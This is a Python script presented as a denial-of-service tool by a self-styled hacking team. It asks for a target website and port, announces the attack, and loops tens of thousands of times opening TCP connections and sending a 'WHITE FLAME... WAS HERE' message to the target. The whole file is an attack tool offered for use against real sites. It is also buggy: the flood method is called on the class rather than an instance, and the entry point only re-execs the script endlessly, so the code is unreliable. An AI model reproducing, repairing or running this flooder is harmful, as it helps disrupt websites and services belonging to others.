import socket
import os
import sys
from banner import flag
from mytimer import dynamic_countdown


baner = """
\033[1;96m|###################################################################|
\033[1;96m|###|               Author By : Wambua                          |###|
\033[1;96m|###|               code      : Python3                         |###|
\033[1;96m|###|               Team      : White Flame EANGLE              |###|
\033[1;96m|###################################################################|
"""
flag
print(baner)


def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)


class __Master_DDOS__():
    def __init__(self):
        self = self

        try:
            # curdir = os.getcwd()
            print("\033[1;91minput web url \033[1;95m[ex : www.example.com ]")
            self.host = input("\033[1;94mWFE@root : ")
            print("\033[1;91minput port \033[1;95m[ex : 8080 ]")
            self.port = input("\033[1;94mWFE@root : ")
        except ValueError as e:
            print(e)
            sys.exit(1)
        except KeyboardInterrupt:
            print("\nExiting..")
            sys.exit(1)

        if self.port == "":
            self.port = 80
        self.port = int(self.port)
        try:
            connect = 50_000
            self.ip = socket.gethostbyname(self.host)

            print(f"\033[1;91m Attacking \033[1;93m[{self.host}]\033[0m")
            print("\033[1;91m Attack to target ip \033[1;93m[" + self.ip + "]" + "\
                  \033[1;91m is inbound\033[0m")
            self.message = b"WHITE FLAME, THE FLAMING EANGLE SYSTEM WAS HERE..."
            dynamic_countdown(3)
            print("\033[1;91mFIRE..............................\033[0m")
        except KeyboardInterrupt:
            print("\nExiting")
            sys.exit(1)

        except Exception as e:
            print(e)

        self.counter = 0
        for i in range(1, connect):
            try:
                self.counter += 1
                __Master_DDOS__.dos()
            except KeyboardInterrupt:
                print("Exiting...")
        sys.exit()

    def dos(self):
        # pid = os.fork()
        try:
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos.connect((self.host, 80))
            ddos.send(self.message)
            ddos.sendto(self.message, (self.ip, self.port))
            ddos.send(self.message)
            print(f"\033[1;92mSending \033[1;33m{self.counter} \033[1;92mpayload to \033[1;35m[" + self.ip + "] ...\033[0m", end="\r")
            ddos.close()
        except KeyboardInterrupt:
            print("\nExiting..")
            sys.exit(1)
        except socket.error:
            print("\033[1;91m ...no connection to [" + self.ip + "] ...")


if __name__ == "__main__":
    restart_program()
